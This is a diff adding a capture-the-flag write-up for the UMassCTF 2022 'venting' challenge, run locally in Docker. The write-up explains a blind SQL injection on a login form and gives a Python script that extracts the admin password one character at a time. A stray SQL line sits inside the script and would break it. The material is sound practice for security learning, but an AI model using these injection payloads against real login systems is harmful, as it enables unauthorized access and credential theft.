@@ -96,5 +96,51 @@ Workflow:
 
 ## venting
 
+This challenge ended and the website was turned off. So i build it in docker from [<mark style="color:blue;">here</mark>](https://github.com/UMassCybersecurity/UMassCTF-2022-challenges)<mark style="color:blue;"></mark>
+
+* when you connectn try to see history in burpsuite, you can get the link redirect to the login page
+* Now read the hint with 'admin' in user and  password does't have fillter so that mean that may be SQLI. Exactly. that's is blind SQLI
+* I solve this challenge by burpsuite as same as [<mark style="color:blue;">this lab</mark>](https://portswigger.net/web-security/sql-injection/blind)<mark style="color:blue;"></mark>
+
+otherway, try to bruteforce by python request:
+
+```
+import requests, string
+
+url = "http://localhost:49153/fff5bf676ba8796f0c51033403b35311/login"
+s = requests.session()
+
+passwordRetrieve = ""
+# ' or (select 'a' from users where username='admin' and length(Password)>36)='a
+
+def solve():
+    global passwordRetrieve
+    index = 0
+    while True:
+        for char in string.printable:
+            usernamefield = "\\"
+            passwordfield = f"' or (select 'a' from users where username='admin' and substr(Password,{index},1)='{char}')='a"
+            postParam = {'user': usernamefield, 'pass': passwordfield}
+            response = s.post(url, data=postParam).text
+            if "Invalid" not in response:
+                passwordRetrieve += char
+                index += 1
+                print(passwordRetrieve)
+                break
+        if (index == 37):
+            break
+SELECT * from users WHERE username='admin\' AND Password = ''or 'True'
+solve()
+```
 
 
+
+
+
+Thanks for reading. Have a good day :heart: !
+
+
+
+Contact:
+
+* <mark style="color:blue;">``</mark>![](<.gitbook/assets/image (6).png>)<mark style="color:blue;"></mark>[<mark style="color:blue;">facebook</mark> ](https://www.facebook.com/rong.truong.372)<mark style="color:blue;"></mark>
